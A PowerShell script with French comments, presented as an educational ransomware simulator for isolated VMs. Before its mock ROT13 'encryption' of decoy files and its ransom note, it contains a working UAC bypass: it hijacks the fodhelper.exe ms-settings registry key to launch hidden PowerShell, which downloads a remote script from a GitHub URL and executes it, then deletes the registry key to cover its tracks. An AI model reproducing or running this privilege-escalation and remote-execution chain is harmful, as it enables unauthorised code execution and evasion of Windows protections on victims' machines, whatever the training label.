# ============================================================
# POC Ransomware Simulator - Version PowerShell
# À utiliser UNIQUEMENT en VM isolée - Usage éducatif uniquement
# ============================================================

# ===== VÉRIFIER SI ON EST ADMIN =====
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")

if (-NOT $isAdmin) {
    # ===== ON N'EST PAS ADMIN → CONTOURNEMENT UAC =====
    Write-Host "[*] Pas administrateur, tentative de contournement UAC..." -ForegroundColor Yellow
    
    # URL du script (à modifier si besoin)
    $scriptUrl = "https://raw.githubusercontent.com/Taku772/La_Plateforme/refs/heads/test-paylod/payload.ps1"
    
    # Modification du registre pour piéger fodhelper.exe
    $registrePath = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
    New-Item $registrePath -Force | Out-Null
    New-ItemProperty -Path $registrePath -Name "DelegateExecute" -Value "" -Force
    Set-ItemProperty -Path $registrePath -Name "(default)" -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command IEX(New-Object Net.WebClient).DownloadString('$scriptUrl')" -Force

    # Déclenche fodhelper.exe (va relancer le script en admin)
    Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
    
    # Attendre que fodhelper.exe ait lu le registre
    Start-Sleep -Seconds 5
    
    # Nettoyer le registre
    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
    
    Write-Host "[+] Contournement declenche. Fermeture..." -ForegroundColor Green
    exit
}

# ===== ON EST ADMIN → EXÉCUTION DU PAYLOAD =====
Write-Host "[*] Execution en mode administrateur - Demarrage de la simulation..." -ForegroundColor Cyan

# ===== ÉTAPE 2 : Créer le README de rançon =====
Write-Host "[*] Creation du dossier README_RANSOMWARE..." -ForegroundColor Cyan

Set-Location -Path "$env:USERPROFILE\Desktop"
New-Item -Path 'README_RANSOMWARE' -ItemType Directory -Force | Out-Null

# Créer le message de rançon
$message = @"
==========================================
     ATTENTION - SIMULATION RANSOMWARE
==========================================

Ceci est une DEMONSTRATION pedagogique.

Dans un cas reel :
- Vos fichiers seraient chiffres
- Leur extension serait modifiee
- Une rancon serait exigee

Dans cette simulation, AUCUN fichier reel
n'a ete modifie de facon permanente.

==========================================
     PROTEGEZ-VOUS CONTRE LES BAD USB
==========================================
"@

$message | Out-File -FilePath 'README_RANSOMWARE\README.txt' -Encoding UTF8
Write-Host "[+] README.txt cree" -ForegroundColor Green

# ===== ÉTAPE 3 : Créer des fichiers de test =====
Write-Host "[*] Creation des fichiers de test..." -ForegroundColor Cyan

Set-Location -Path "$env:USERPROFILE\Desktop\README_RANSOMWARE"

"Les IP Serveur" | Out-File -FilePath 'document_test_1.txt' -Encoding UTF8
"Les MDP ADMIN" | Out-File -FilePath 'document_test_2.docx' -Encoding UTF8
"Les comptes bancaire" | Out-File -FilePath 'document_test_3.xlsx' -Encoding UTF8
Write-Host "[+] 3 fichiers de test crees" -ForegroundColor Green

# ===== ÉTAPE 4 : "Chiffrer" et renommer les fichiers =====
Write-Host "[*] Simulation du chiffrement en cours..." -ForegroundColor Cyan

Get-ChildItem -File | ForEach-Object {
    # Lecture du contenu original
    $content = Get-Content $_.FullName -Raw
    
    # Simple transformation pour simuler le chiffrement (ROT13)
    $encrypted = -join ($content.ToCharArray() | ForEach-Object {
        if ($_ -match '[A-Za-z]') {
            if ($_ -match '[A-Z]') { $offset = 65 } else { $offset = 97 }
            [char]( ( ($_ - $offset) + 13 ) % 26 + $offset )
        } else { $_ }
    })
    
    # Écriture du contenu "chiffré"
    Set-Content -Path $_.FullName -Value $encrypted -Encoding UTF8
    
    # Changement de l'extension pour simuler le blocage
    $newName = $_.BaseName + '.locked'
    Rename-Item -Path $_.FullName -NewName $newName
    
    Write-Host "    -> Chiffre : $($_.Name) -> $newName" -ForegroundColor Gray
}

Write-Host "[+] Chiffrement et renommage termines" -ForegroundColor Green

# ===== ÉTAPE 5 : Ouvrir le README pour le message =====
Write-Host "[*] Ouverture du README..." -ForegroundColor Cyan
Start-Process notepad.exe -ArgumentList "README_RANSOMWARE\README.txt"

# ===== ÉTAPE 6 : Fin =====
Write-Host "[*] Simulation terminee !" -ForegroundColor Green
Write-Host "[+] Dossier : $env:USERPROFILE\Desktop\README_RANSOMWARE" -ForegroundColor Cyan
